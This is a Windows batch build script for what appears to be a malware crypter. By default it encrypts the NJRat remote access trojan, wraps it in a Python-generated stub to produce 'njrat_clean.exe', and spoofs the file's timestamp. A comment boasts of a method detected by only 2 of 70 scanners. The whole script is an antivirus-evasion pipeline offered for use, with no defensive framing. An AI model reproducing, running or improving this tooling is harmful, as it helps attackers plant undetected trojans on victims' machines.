@echo off
REM Build using Python stub generator (proven 2/70 method)
REM Usage: build.bat [PAYLOAD] [OUTPUT] [PASSWORD] [LEVEL]
REM Example: build.bat payloads\malware.exe output.exe MyPass123 8

REM Parse arguments with defaults
if "%~1"=="" (
    set "PAYLOAD=payloads\NJRat.exe"
) else (
    set "PAYLOAD=%~1"
)

if "%~2"=="" (
    set "OUTPUT=njrat_clean.exe"
) else (
    set "OUTPUT=%~2"
)

if "%~3"=="" (
    set "PASSWORD=SecureKey2026!"
) else (
    set "PASSWORD=%~3"
)

if "%~4"=="" (
    set "LEVEL=6"
) else (
    set "LEVEL=%~4"
)

echo ========================================
echo CLEAN BUILD - Using Python Stub
echo ========================================
echo.
echo Configuration:
echo   Payload:  %PAYLOAD%
echo   Output:   %OUTPUT%
echo   Password: %PASSWORD%
echo   Level:    %LEVEL%
echo ========================================

echo.
echo [1/3] Encrypting payload...
python xorcrypt_advanced.py encrypt %PAYLOAD% temp_payload.enc -p %PASSWORD% -l %LEVEL%
if errorlevel 1 (
    echo ERROR: Encryption failed
    exit /b 1
)

echo.
echo [2/3] Generating stub (NO polymorphic, NO memory-protect)...
python xorcrypt_advanced.py stub temp_payload.enc build\%OUTPUT% -p %PASSWORD% -l %LEVEL%
if errorlevel 1 (
    echo ERROR: Stub generation failed
    exit /b 1
)

echo.
echo [3/3] Spoofing timestamp...
python metadata_spoof.py build\%OUTPUT% build\%OUTPUT% 2018
if errorlevel 1 (
    echo ERROR: Timestamp spoofing failed
    exit /b 1
)

echo.
echo ========================================
echo SUCCESS!
echo Output: build\%OUTPUT%
echo ========================================

del temp_payload.enc

dir build\%OUTPUT%
